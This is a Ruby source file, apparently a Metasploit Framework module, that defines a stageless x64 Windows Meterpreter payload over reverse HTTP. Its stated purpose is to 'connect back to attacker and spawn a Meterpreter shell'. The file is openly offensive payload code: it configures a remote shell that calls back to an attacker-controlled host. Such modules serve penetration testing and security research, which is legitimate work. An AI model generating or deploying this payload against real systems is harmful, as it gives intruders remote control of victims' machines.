##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/handler/reverse_http/stageless'
require 'msf/core/payload/windows/x64/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'

module Metasploit4

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter_x64
  include Msf::Handler::ReverseHttp::Stageless
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTP Inline (x64)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_x64_Win
      ))

    initialize_stageless
  end

  def generate
    # generate a stageless payload using the x64 version of
    # the stageless generator
    opts = {
      :ssl       => false,
      :generator => method(:generate_stageless_x64)
    }
    generate_stageless(opts)
  end

end
